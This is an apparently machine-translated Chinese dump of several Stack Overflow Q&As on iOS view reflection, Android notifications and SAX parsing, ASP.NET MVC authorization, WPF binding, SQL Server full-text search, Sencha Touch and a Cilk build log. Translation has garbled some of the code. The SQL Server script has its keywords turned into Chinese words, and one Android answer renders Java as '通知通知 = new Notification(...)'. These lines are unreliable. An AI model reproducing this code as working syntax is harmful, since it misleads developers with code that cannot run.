        [self.activeView.attributedView.attributes setValue: [NSNumber numberWithBool:NO]  forKey:kIsReflected];
    }else {
        //do reflection
        self.activeView.transform = CGAffineTransformMakeScale(-1,1);
        [self.activeView.attributedView.attributes setValue: [NSNumber numberWithBool:YES]  forKey:kIsReflected];
    } 
```

上面的代码用于 UIView 动画。您将在其中获得各种类型动画的选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:45:38.887

您可以通过以下方式制作任何视图的“屏幕截图”

```
UIGraphicsBeginImageContext(self.view.frame.size);
[self.view.layer renderInContext:UIGraphicsGetCurrentContext()];
UIImage *viewImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

然后翻转 UIImage 并在视图下方添加一个 UIImageView 和生成的 Image。

# android - 在android中清除正在进行的通知

> ID：10685425
> 
> 赞同：3
> 
> 时间：2012-05-21T12:38:16.247
> 
> 标签：android

在我的应用程序中，我在上传视频时显示正在进行的通知。我想在上传后清除通知。我搜索了很多，无法得到明确的答案。如果有人知道，请帮助我...

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T12:43:16.697

从在 android 文档中[管理您的通知：](http://developer.android.com/guide/topics/ui/notifiers/notifications.html#ManageYourNotifications)

> 您也可以使用 cancel(int) 手动清除它，将通知 ID 传递给它，或者使用 cancelAll() 清除所有通知。

因此，您应该执行以下操作来隐藏通知：

```
mNotificationManager.cancel(notification_id); 
```

其中`mNotificationManager`是`NotificationManager`对象，`notification_id`是`int`传递给对象的通知标识符`NotificationManager`：

```
mNotificationManager.notify(notification_id, notification); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-06-12T18:16:33.940

只是为了展示如何使用 Notification.Builder 完成此操作，您可以像这样设置 FLAG_AUTO_CANCEL：

```
Notification.Builder mBuilder = new Notification.Builder(getContext())
                    .setSmallIcon(R.drawable.icon)
                    .setContentTitle("My notification")
                    .setContentText("Hello Notify!")
                    .setOngoing(true)
                    .setAutoCancel(true); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T12:50:38.917

**您可以通过单击它来清除您的通知..!!**

通知通知 = new Notification("您需要的数据..");

notification.flags |= Notification.FLAG_AUTO_CANCEL;

# android - Android SAX 解析器错误

> ID：10685427
> 
> 赞同：0
> 
> 时间：2012-05-21T12:38:20.770
> 
> 标签：android, xml, sax, nullreferenceexception, android-xml

我正在尝试为 Android 制作一个 SAX 解析器，并从外部 XML 文件中仅读取一个标签开始。我收到“不幸的是，-- 已停止”错误。我查看了日志文件，它给了我一个空引用错误。我的猜测是 XMLAdapter 类不能正常工作，我无法解决问题。

这是我的主要活动：

```
package com.vint.michiganbus;

import java.net.URL;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.TextView;
import android.view.Window;
import android.util.Log;

public class listView extends Activity {
    XMLGettersSetters data;
    private static final String TAG = "listView";
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);

        View layout = findViewById(R.id.layout);

        TextView title[];

        Log.i(TAG, "data is hello");
        try {
            /**
            * Create a new instance of the SAX parser
            **/
            SAXParserFactory saxPF = SAXParserFactory.newInstance();
            SAXParser saxP = saxPF.newSAXParser();
            XMLReader xmlR = saxP.getXMLReader();

            URL url = new URL("http://mbus.pts.umich.edu/shared/public_feed.xml"); // URL of the XML

            /**
            * Create the Handler to handle each of the XML tags.
            **/
            XMLHandler myXMLHandler = new XMLHandler();
            xmlR.setContentHandler(myXMLHandler);
            xmlR.parse(new InputSource(url.openStream()));

        } catch (Exception e) {
            System.out.println(e);
        }

        data = XMLHandler.data;

        /** 
         * Makes the TextView length the size of the TextView arrays by getting the size of the 
         **/
        title = new TextView[data.get().size()];        

        /** 
         * Run a for loop to set All the TextViews with text until 
         * the size of the array is reached.
         * 
         **/
        for (int i = 0; i < data.get().size(); i++) {

            title[i] = new TextView(this);
            title[i].setText("Title = "+data.get().get(i));

            ((ViewGroup) layout).addView(title[i]);
            }

        setContentView(layout);

        //setContentView(R.layout.listview);
    }
} 
```

这是我的 XML 处理程序：

```
package com.vint.michiganbus;

import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;
import android.util.Log;

public class XMLHandler extends DefaultHandler {
    private static final String TAG = "In Handler";
    String elementValue = null;
    Boolean elementOn = false;
    public static XMLGettersSetters data = null;

    public static XMLGettersSetters getXMLData() {
        return data;
    }

    public static void setXMLData(XMLGettersSetters data) {
        XMLHandler.data = data;
    }

    /**
     * This will be called when the tags of the XML starts.
     **/
    @Override
    public void startElement(String uri, String localName, String qName,
            Attributes attributes) throws SAXException {

        elementOn = true;
        Log.i(TAG, "starting Element "+localName);
        if (localName.equals("livefeed"))
        {
            data = new XMLGettersSetters();
        } else if (localName.equals("routecount")) {
            /**
             * We can get the values of attributes for eg. if the CD tag had an attribute( <CD attr= "band">Akon</CD> )
             * we can get the value "band". Below is an example of how to achieve this.
             *
             * String attributeValue = attributes.getValue("attr");
             * data.setAttribute(attributeValue);
             *
             * */
        }
    }

    /**
     * This will be called when the tags of the XML end.
     **/
    @Override
    public void endElement(String uri, String localName, String qName)
            throws SAXException {

        elementOn = false;

        /**
         * Sets the values after retrieving the values from the XML tags
         * */
        if (localName.equalsIgnoreCase("routecount"))
            data.set(elementValue);
        /*else if (localName.equalsIgnoreCae("artist"))
            data.setArtist(elementValue);
        else if (localName.equalsIgnoreCase("country"))
            data.setCountry(elementValue);
        else if (localName.equalsIgnoreCase("company"))
            data.setCompany(elementValue);
        else if (localName.equalsIgnoreCase("price"))
            data.setPrice(elementValue);
        else if (localName.equalsIgnoreCase("year"))
            data.setYear(elementValue);*/
    }

    /**
     * This is called to get the tags value
     **/
    @Override
    public void characters(char[] ch, int start, int length)
            throws SAXException {

        if (elementOn) {
            elementValue = new String(ch, start, length);
            elementOn = false;
        }

    }

} 
```

这是我的 GetterSetter 类

```
package com.vint.michiganbus;

import java.util.ArrayList;

public class XMLGettersSetters {
    private ArrayList<String> routecount = new ArrayList<String>();

    public ArrayList<String> get() {
        return routecount;
    }
    public void set(String company) {
            this.routecount.add(company);
    }
} 
```

任何帮助将不胜感激！

ps：如果有人对如何有效地处理 URL 中的 XML 有任何建议，我会很高兴的！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-06T13:15:11.320

错误可能是您正尝试从活动线程中检索 Web 文件。我将创建一个 AsyncTask，将我所有的解析器代码放在 AsyncTask 的 doInBackground() 方法中。看起来像这样的东西：

```
private class DownloadFilesTask extends AsyncTask<Document, Integer, Document> 
{
    Document doc;
    String xml;

    public DownloadFilesTask(){}

    protected Document doInBackground(Document... params) 
    {
        xml = xmlFunctions.getXML("Your URL");
        doc = XmlFunctions.XMLfromString(xml);
        return doc;
    } 
    protected void onPostExecute(Document result) 
    {
      //Some code changing UI from the nodes you've just parsed
    }  
} 
```

然后你可以在你的 onCreate 中调用这个类：

```
new DownloadTaskfiles().execute(); 
```

希望这个对你有帮助！

# asp.net-mvc-3 - ASP.Net MVC 3 查询字符串参数

> ID：10685428
> 
> 赞同：0
> 
> 时间：2012-05-21T12:38:22.457
> 
> 标签：asp.net-mvc-3, query-string

我正在开发一个 ASP.Net MVC 3 Web 应用程序。在我的一些视图中，我向用户显示表格数据，并且在表格中的每条记录旁边都有一个编辑链接。当用户单击此链接时，它会将他们带到一个编辑页面，他们可以在其中编辑和更新记录。

我的问题是，一旦用户单击编辑链接，URL 就会变成这样

```
http://www.mytestsite.com/myData/edit/3 
```

“3”是要更新的记录的 ID，但是，没有什么能阻止用户将“3”更改为另一个数字，这意味着他们可以编辑不属于他们的记录。

有没有人可以解决我如何防止这种情况发生的方法？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:47:25.683

您需要在应用程序中引入身份验证和授权。[这里有一篇关于如何开始的文章](http://bradygaster.com/custom-authentication-with-mvc-3.0)。您还需要弄清楚如何存储登录的用户身份，然后在创建记录时如何将其附加到记录中。然后，您必须在服务器上验证随后的编辑请求是由首先创建记录的用户（或在您的系统上具有允许他们执行此操作的角色的用户发出的，例如行政人员）。

即使 ID 没有显示在 URL 上，恶意用户仍然可以操纵 HTTP 请求来传递他们选择的 ID。在任何安全系统中，您应该始终、始终、始终验证当前登录的用户是否真正有权执行请求的操作。您永远不应依赖浏览器返回的内容来确定这一点（除了由 MVC 框架安全管理的身份验证上下文。通常）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-21T13:04:51.960

我相信您应该在您的表格中获得有关谁拥有此特定资源的编辑权限的信息。例如：在您的表中，您可能有“ `CreatedById`”列，您可以在其中存储创建此记录的用户的 ID。现在在您的编辑操作方法中，您检查`CreatedById`当前项目的“ `UserId`”是否与当前用户的“”相同（如果您将其存储在会话中，您可以从会话中获取）。像这样的东西。

```
public ActionResult Edit(int id)
{
  int currentUserID=1; // TO DO : get this value from session or somewhere

  ProductVieWModel product=myRepo.GetProduct(id);

  if(product!=null)
  {
     if(product.CreatedById==currentUserID)
     {
        return View(product);
     }
     else
     {
        return View("NotAutherized");
     }
  }
  return View("ProdcutNotFound");

} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-15T09:44:35.153

您应该尝试使用 GUID 数据类型，因为它在这些情况下会有所帮助，并且用户无法轻易猜出下一个值

# c - 在c中的PATH环境中搜索应用程序

> ID：10685434
> 
> 赞同：0
> 
> 时间：2012-05-21T12:38:38.640
> 
> 标签：c, execvp

我正在尝试按名称在 c 中执行应用程序，在运行之前我想知道该名称是否合法。有没有办法签入c，并找出应用程序是否存在于PATH环境中？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:36:06.530

可能最好的方法是模仿 Lunar Mushrooms 已经建议的“which”命令的行为。

快速查看以下命令的输出

```
$ strace which ls 
```

揭示了 'which' 只是循环通过 $PATH 条目，将它与命令名称（上例中的'ls'）连接起来并在其上调用 stat64。如果 stat64 返回与 -1 不同的内容（意味着该文件存在），它会中断循环。以下是测试命令的相关输出片段：

```
...
stat64("/home/mz/bin/ls", 0xbfa84350)   = -1 ENOENT (No such file or directory)
stat64("/usr/local/sbin/ls", 0xbfa84350) = -1 ENOENT (No such file or directory)
stat64("/usr/local/bin/ls", 0xbfa84350) = -1 ENOENT (No such file or directory)
stat64("/usr/sbin/ls", 0xbfa84350)      = -1 ENOENT (No such file or directory)
stat64("/usr/bin/ls", 0xbfa84350)       = -1 ENOENT (No such file or directory)
stat64("/sbin/ls", 0xbfa84350)          = -1 ENOENT (No such file or directory)
stat64("/bin/ls", {st_mode=S_IFREG|0755, st_size=96324, ...}) = 0
stat64("/bin/ls", {st_mode=S_IFREG|0755, st_size=96324, ...}) = 0
geteuid32()                             = 1000
getgid32()                              = 1000
... 
```

# c# - 尽管值为 true，但未选中复选框

> ID：10685437
> 
> 赞同：-6
> 
> 时间：2012-05-21T12:38:54.133
> 
> 标签：c#, wpf

所以我的列更新有问题，据我所知，它的更新很好，但由于某种原因，应该检查的实际复选框不是。我似乎无法弄清楚为什么所有值都设置为 true。

```
using (IDbConnection connection = sessionFactory.ConnectionProvider.GetConnection())
{
    if (TableExists(connection, "tbl_ecom_cat_feature") && 
        ColumnExists(connection, "tbl_ecom_cat_feature", "display_on_search"))
    {
        using (IDbCommand cmd = connection.CreateCommand())
        {
            cmd.CommandText = "UPDATE tbl_ecom_cat_feature SET display_on_search = 1";
            cmd.ExecuteNonQuery();
        }
    } 
```

编辑：我刚刚意识到，在我的 Checkbox_Check 方法中，我实际上并没有放入任何东西来检查它是否已被检查...我实际上不确定如何从 SQL 列中获取数据以查看它是否正确以及是否正确是，返回选中的框。

我在其中显示复选框的代码：

```
public class StringToVisibilityConverter : IValueConverter
{
public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
    if (value != null && value is string)
        {
        var input = (string)value;
        if (string.IsNullOrEmpty("Name"))
            {
            return Visibility.Collapsed;
        }
        else
        {
            return Visibility.Visible;
        }
    }

    return Visibility.Visible;
} 
```

显示这些复选框的 WPF 代码如下：

```
<GridViewColumn Header="Display On Search">
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <CheckBox Visibility="{Binding StringToVisibilityConverter}" IsChecked="{Binding StringToVisibilityConverter}" />
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>                            
                    </GridViewColumn> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-14T19:03:28.640

您需要将您的属性绑定到您的值`datacontext`，然后在绑定中分配转换器，以便它将您的源值转换为目标值。代码：

```
<GridViewColumn Header="Display On Search">
                        <GridViewColumn.CellTemplate>
                            <DataTemplate>
                                <CheckBox Visibility="{Binding sourceProp, Converter={StaticResource myStringToVisibilityConverter}}" />
                            </DataTemplate>
                        </GridViewColumn.CellTemplate>                            
                    </GridViewColumn> 
```

并且您需要将转换器指定为资源，例如：

```
<Window.Resources>
        <con:StringToVisibilityConverter x:Key="myStringToVisibilityConverter" />
</Window.Resources> 
```

资源也可以在`XAML`例如另一个级别上设置。网格视图。

# cocos3d - POD 文件未加载

> ID：10685443
> 
> 赞同：2
> 
> 时间：2012-05-21T12:39:33.460
> 
> 标签：cocos3d

我一直在尝试自己理解 Cocos3D 应用程序开发。我发现的最大障碍是没有加载 POD。我使用 Collada2POD 转换器转换为 POD，其中 Collada 文件实际上是从搅拌机中导出的。我尝试下载 SDK 和转换器，但还是一样。我真的无法弄清楚我的 POD 的实际问题是什么。PVRShaman 工具用于验证 POD，它说 POD 没问题。有人可以帮我找出实际问题。

注意：我正在使用 MacLion 10.7.4。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-20T14:59:55.887

自己找到了解决方案..

我忘记在搅拌机中设置材料（在我的例子中是立方体）的比例和位置。现在它已加载，我可以看到它在旋转。将材料导出为 Collada 即；.dae 格式并使用 Collada2POD 转换器获取 .pod 文件。稍后向它添加操作，因为它是为 hello-world 示例完成的

# sql-server - SQL Server 包含不返回预期结果的全文函数

> ID：10685444
> 
> 赞同：2
> 
> 时间：2012-05-21T12:39:36.673
> 
> 标签：sql-server, sql-server-2008, full-text-search

我不太明白为什么我会从以下查询/语句中得到意外结果。我已经包含了复制问题的代码（这可能根本不是问题，但更多的是我对如何`contains`工作的误解）。

```
创建表 dbo.temp (id int identity, description nvarchar(max))
插入 dbo.temp 值（'这是一个网站。'）——这条记录将在选择查询中返回
insert dbo.temp values ('a website exists.') --这条记录将在select中返回
插入 dbo.temp 值（'go to mywebsite.net'）——该记录不会在选择中返回
插入 dbo.temp 值（“转到 mywebsite.net。”）——该记录不会在选择中返回

创建全文目录临时
在 dbo.temp (id) 上创建唯一索引 idx_dbo_temp_1
在 dbo.temp(description) 上创建全文索引
    temp 上的键索引 idx_dbo_temp_1
    使用 change_tracking 自动

声明 @search_client nvarchar(100) = '网站'

选择
    *
从
    dbo.temp
在哪里
    包含（（描述），@search_client）

在 dbo.temp 上删除全文索引
在 dbo.temp 上删除索引 idx_dbo_temp_1
删除全文目录临时
删除表 dbo.temp

```

该查询将返回`website`描述字段中的记录，但不会返回描述字段中的记录`mywebsite.net`。

有什么想法吗？

更新：该`@search_client`变量实际上是通过 SSRS 传入的参数，因此声明了该变量以模拟传入的参数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:34:34.280

在全文中，**索引中的所有非字母数字字符都将被删除并替换为空白**。所以在你的搜索中，因为你有“。” 在字符串中，您正在搜索“网站”和“网络”。

您可以通过 2 种方式解决此问题。

如果您保留原始数据，您需要有一个单独的表或单独的字段来包含全文数据，与原始表分开。

在全文表格中，您可以删除“ **.** ”并存储“ **websitenet** ”。

在这种情况下，您需要删除所有“。” 在执行查询之前从搜索字符串中提取。如果要用“.”查询，则需要替换“.”。带有字符串 - 例如“点”。

因此，在这种情况下，您将存储“ **websitedotnet** ”。

这次搜索时，替换所有“。” 在查询中带有“点”。

好的，现在您的案例有一个新字段，其中存储要由 FTS 搜索的列，因此：

```
 ID      DESCRIPTION               DESCFTS
    -----------------------------------------------------
    1   this is a website.        this is a websitedot
    2   a website exists.         a website existsdot
    3   go to mywebsite.net       go to mywebsitedotnet
    4   go to mywebsite.net.      go to mywebsitedotnetdot 
```

那么你的查询：

```
declare @search_client nvarchar(100) = 'website'

set @search_client = replace(@search_client, '.', 'dot')

select * from dbo.temp where contains ((DESCFTS), @search_client) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:48:52.147

尝试以下操作：

更新：

```
select
    *
from
    dbo.temp
where
    contains ((description),'"website*"') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:45:38.170

我认为您遇到的问题是，不幸的是，无法在 FTS 中使用前导通配符进行搜索。如果您使用 CONTAINS 短语进行搜索，则不能使用前导，只能使用尾随功能。寻找引导通配符搜索的解决方法。这是我在 mywebsite.net 中没有显示问题的原因。这与已经提到的 DOT 问题相结合。有一些解决方法，但它们对我来说似乎很老套——并且还研究了 FREETEXT 以获得性能提升的可能性。

# sencha-touch - 如何使用 sencha touch 获得 hasOne 模型

> ID：10685452
> 
> 赞同：1
> 
> 时间：2012-05-21T12:40:24.477
> 
> 标签：sencha-touch, sencha-touch-2

我有一个模型横幅和一个模型 BannerFormat。横幅具有横幅格式。为了配置横幅和横幅格式之间的 hasOne 关系，我写了这个：

```
Ext.define('admin.model.Banner', {
    extend: 'Ext.data.Model',
    config: {
        fields: [
            { name: 'id', type: 'int' },
            { name: 'banner_format_id', type: 'int' },
            'code',
            'active',
            'start_at',
            'end_at'
        ],
        associations: { type: 'hasOne', model: 'admin.model.BannerFormat', getterName: 'getBannerFormat' },
        proxy: {
            type: 'ajax',
            url: '/admin/api_query.php',
            extraParams: {
                table: 'content_banners',
                type: 'GET'
            }
        }
    }
}); 
```

在我的bannerFormat模型中：

```
Ext.define('admin.model.BannerFormat', {
    extend: 'Ext.data.Model',
    config: {
        fields: ['id', 'format'],
        associations: { type: 'hasMany', model: 'admin.model.Banner' },
        proxy: {
            type: 'ajax',
            url: '/admin/api_query.php',
            extraParams: {
                table: 'content_banner_formats',
                type: 'GET'
            }
        }
    }
}); 
```

但是当我调用 banner.getBannerFormat() 时，我得到了：

```
Uncaught TypeError: Object [object Object] has no method 'getBannerFormat' 
```

我做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T20:00:05.757

您是否正在创建一个横幅对象，然后对其进行调用以检索已定义的关联？

这应该适合你：

```
var banner = Ext.create('admin.model.Banner', {
    id: 100,
    banner_format_id: 20,
    code: 'ABC123',
    active: true,
    start_at: 1,
    end_at: 5
});

banner.getBannerFormat(); 
```

此外，如果您不想要，也不需要为关联指定 getterName。Sencha 将为关联自动生成一个 getter 函数，其格式为：'getModelName'。如果您从关联中删除了 getterName，则横幅模型上的 getter 函数将与您定义的相同：'getBannerFormat';

# linux - Ubuntu上的Cilk安装错误

> ID：10685455
> 
> 赞同：1
> 
> 时间：2012-05-21T12:40:30.927
> 
> 标签：linux, compiler-construction, cilk

我想在我的linux机器上安装cilk，在他们的目录中他们告诉我写：`./configure`然后`make`在`make install`我的机器上安装编译器，但是当我输入`make`它时它会给出很多消息，最后它会给我以下错误：

```
Compilation Failed: 1 error, 0 warnings
Error: failed running cilk2c
make[2]: *** [fib.o] Error 1
make[2]: Leaving directory `/home/khaled/Desktop/cilk-5.4.6/examples'
make[1]: *** [all-recursive] Error 1
make[1]: Leaving directory `/home/khaled/Desktop/cilk-5.4.6'
make: *** [all] Error 2 
```

我从这里下载了 cilk 目录：[http://supertech.csail.mit.edu/cilk/][1]

有没有办法让它工作？另外，有没有办法在windows上安装cilk？

注意：我不知道这是否重要，但我在 VirtualBox 上运行 Ubuntu 11.10。

编辑：

我得到了打字后得到的全部打印件`make`，但我无法得到全部打印件，因为我认为没有足够的空间，无论如何这里是从顶部到我得到的陈述的结尾：

```
mv -f .deps/libcilk_p_la-cilk.Tpo .deps/libcilk_p_la-cilk.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-sched.lo -MD -MP -MF .deps/libcilk_p_la-sched.Tpo -c -o libcilk_p_la-sched.lo `test -f 'sched.c' || echo './'`sched.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-sched.lo -MD -MP -MF .deps/libcilk_p_la-sched.Tpo -c sched.c  -fPIC -DPIC -o .libs/libcilk_p_la-sched.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-sched.lo -MD -MP -MF .deps/libcilk_p_la-sched.Tpo -c sched.c -o libcilk_p_la-sched.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-sched.Tpo .deps/libcilk_p_la-sched.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-hooks.lo -MD -MP -MF .deps/libcilk_p_la-hooks.Tpo -c -o libcilk_p_la-hooks.lo `test -f 'hooks.c' || echo './'`hooks.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-hooks.lo -MD -MP -MF .deps/libcilk_p_la-hooks.Tpo -c hooks.c  -fPIC -DPIC -o .libs/libcilk_p_la-hooks.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-hooks.lo -MD -MP -MF .deps/libcilk_p_la-hooks.Tpo -c hooks.c -o libcilk_p_la-hooks.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-hooks.Tpo .deps/libcilk_p_la-hooks.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-stats.lo -MD -MP -MF .deps/libcilk_p_la-stats.Tpo -c -o libcilk_p_la-stats.lo `test -f 'stats.c' || echo './'`stats.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-stats.lo -MD -MP -MF .deps/libcilk_p_la-stats.Tpo -c stats.c  -fPIC -DPIC -o .libs/libcilk_p_la-stats.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-stats.lo -MD -MP -MF .deps/libcilk_p_la-stats.Tpo -c stats.c -o libcilk_p_la-stats.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-stats.Tpo .deps/libcilk_p_la-stats.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-barrier.lo -MD -MP -MF .deps/libcilk_p_la-barrier.Tpo -c -o libcilk_p_la-barrier.lo `test -f 'barrier.c' || echo './'`barrier.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-barrier.lo -MD -MP -MF .deps/libcilk_p_la-barrier.Tpo -c barrier.c  -fPIC -DPIC -o .libs/libcilk_p_la-barrier.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-barrier.lo -MD -MP -MF .deps/libcilk_p_la-barrier.Tpo -c barrier.c -o libcilk_p_la-barrier.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-barrier.Tpo .deps/libcilk_p_la-barrier.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-cmdline.lo -MD -MP -MF .deps/libcilk_p_la-cmdline.Tpo -c -o libcilk_p_la-cmdline.lo `test -f 'cmdline.c' || echo './'`cmdline.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-cmdline.lo -MD -MP -MF .deps/libcilk_p_la-cmdline.Tpo -c cmdline.c  -fPIC -DPIC -o .libs/libcilk_p_la-cmdline.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-cmdline.lo -MD -MP -MF .deps/libcilk_p_la-cmdline.Tpo -c cmdline.c -o libcilk_p_la-cmdline.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-cmdline.Tpo .deps/libcilk_p_la-cmdline.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-internal-malloc.lo -MD -MP -MF .deps/libcilk_p_la-internal-malloc.Tpo -c -o libcilk_p_la-internal-malloc.lo `test -f 'internal-malloc.c' || echo './'`internal-malloc.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-internal-malloc.lo -MD -MP -MF .deps/libcilk_p_la-internal-malloc.Tpo -c internal-malloc.c  -fPIC -DPIC -o .libs/libcilk_p_la-internal-malloc.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-internal-malloc.lo -MD -MP -MF .deps/libcilk_p_la-internal-malloc.Tpo -c internal-malloc.c -o libcilk_p_la-internal-malloc.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-internal-malloc.Tpo .deps/libcilk_p_la-internal-malloc.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-timing.lo -MD -MP -MF .deps/libcilk_p_la-timing.Tpo -c -o libcilk_p_la-timing.lo `test -f 'timing.c' || echo './'`timing.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-timing.lo -MD -MP -MF .deps/libcilk_p_la-timing.Tpo -c timing.c  -fPIC -DPIC -o .libs/libcilk_p_la-timing.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-timing.lo -MD -MP -MF .deps/libcilk_p_la-timing.Tpo -c timing.c -o libcilk_p_la-timing.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-timing.Tpo .deps/libcilk_p_la-timing.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-invoke-main.lo -MD -MP -MF .deps/libcilk_p_la-invoke-main.Tpo -c -o libcilk_p_la-invoke-main.lo `test -f 'invoke-main.c' || echo './'`invoke-main.c
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-invoke-main.lo -MD -MP -MF .deps/libcilk_p_la-invoke-main.Tpo -c invoke-main.c  -fPIC -DPIC -o .libs/libcilk_p_la-invoke-main.o
 gcc -DHAVE_CONFIG_H -I. -I.. -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1 -pthread -g -O2 -MT libcilk_p_la-invoke-main.lo -MD -MP -MF .deps/libcilk_p_la-invoke-main.Tpo -c invoke-main.c -o libcilk_p_la-invoke-main.o >/dev/null 2>&1
mv -f .deps/libcilk_p_la-invoke-main.Tpo .deps/libcilk_p_la-invoke-main.Plo
/bin/bash ../libtool --tag=CC   --mode=compile gcc -DHAVE_CONFIG_H -I. -I..  -DCILK_TIMING=1 -DCILK_STATS=1 -DCILK_CRITICAL_PATH=1  -pthread -g -O2 -MT libcilk_p_la-malloc.lo -MD -MP -MF .deps/libcilk_p_la-malloc.Tpo -c -o libcilk_p_la-malloc.lo `test -f 'malloc.c' || echo './'`malloc.c
